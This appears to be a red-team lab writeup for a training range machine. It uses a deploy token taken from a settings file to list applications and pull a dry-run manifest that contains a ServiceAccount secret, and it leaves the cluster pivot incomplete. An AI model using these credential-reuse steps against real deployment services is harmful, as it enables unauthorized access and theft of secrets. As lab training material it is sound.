# solve_red.md — M5 · dev-deploy
## Red Team Solution Writeup
**Range:** RNG-DEV-01 · VIKAS TANTRA
**Machine:** M5 — PUL Deploy Commander
**Vulnerability:** Dry-run API returns a manifest containing a ServiceAccount token
**MITRE ATT&CK:** T1552.001

---

## Objective

Use the Deploy Commander token retrieved from M4 to list applications and request a dry-run sync for `pul-ota-firmware`.

## Environment

| Item | Value |
|---|---|
| Deploy Commander | `203.0.3.36:8888` |
| API token source | `$RANGE3_DIR/sonar-settings.json` |
| Application | `pul-ota-firmware` |
| Reported cluster | `193.x.x.x:6443` (placeholder) |

## Step-by-Step Exploitation

### Step 1 — List applications

```bash
DEPLOY_TOKEN="$(jq -r '(if type == "array" then .[] else (.settings // .values // [])[] end) | select(.key == "sonar.ci.deploy_token") | .value' "$RANGE3_DIR/sonar-settings.json")"
curl --max-time 8 -fsS http://203.0.3.36:8888/api/applications \
     -H "Authorization: Bearer ${DEPLOY_TOKEN}" | jq .
```
<img width="1288" height="636" alt="WindowsTerminal_EQqYv6AdM0" src="https://github.com/user-attachments/assets/6c61c6bb-5934-4bac-8c68-a87a28dd7553" />

The response includes `pul-ota-firmware`.

### Step 2 — Request a dry-run manifest

```bash
curl --max-time 8 -fsS -X POST \
     "http://203.0.3.36:8888/api/applications/pul-ota-firmware/sync?dryRun=true" \
     -H "Authorization: Bearer ${DEPLOY_TOKEN}" \
     -o "$RANGE3_DIR/dryrun.json"
jq '{result, warning, manifest_present: (.manifest != null)}' "$RANGE3_DIR/dryrun.json"
```
<img width="1307" height="220" alt="WindowsTerminal_n8FMa62C5h" src="https://github.com/user-attachments/assets/c14f2f6e-e498-418c-a92e-1505c37781e7" />

The API returned a dry-run manifest. No sync was applied to a cluster.

### Step 3 — Inspect the manifest without printing token data

```bash
jq -r '.manifest' "$RANGE3_DIR/dryrun.json" | grep -E 'kind: Secret|cluster_endpoint:|namespace:' | sed -E 's/(token:).*/\1 <redacted>/'
```
<img width="1260" height="207" alt="WindowsTerminal_5lvI1o86M5" src="https://github.com/user-attachments/assets/31f24937-bf30-47b7-a11c-2a476acc7111" />

The manifest contains a ServiceAccount Secret and reports `https://193.x.x.x:6443`. That address is a placeholder, not a validated cluster endpoint.

### Step 4 — Cluster pivot status

The repository does not include RNG-CLD-01 provisioning or a real cluster address. The M5 Deploy Commander service and dry-run API work, but the Kubernetes pivot cannot be completed from the provided files. Do not use the placeholder kubeconfig or disable TLS verification.

## MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|---|---|---|
| Credential Access | Unsecured Credentials: Credentials in Files | T1552.001 |
| Lateral Movement | Remote Services | T1021 |
| Discovery | Cloud Service Discovery | T1526 |

## Local cleanup

After completing the lab steps, remove the downloaded files and clear the shell variables:

```bash
rm -f "$RANGE3_DIR/docker-config.json" "$RANGE3_DIR/registry-config.json" "$RANGE3_DIR/sonarqube-access.env" "$RANGE3_DIR/sonar-settings.json" "$RANGE3_DIR/dryrun.json"
rmdir "$RANGE3_DIR"
unset REGISTRY_USER REGISTRY_PASSWORD_CANDIDATE MINIO_ACCESS_KEY MINIO_SECRET_KEY DEPLOY_TOKEN RANGE3_DIR
```
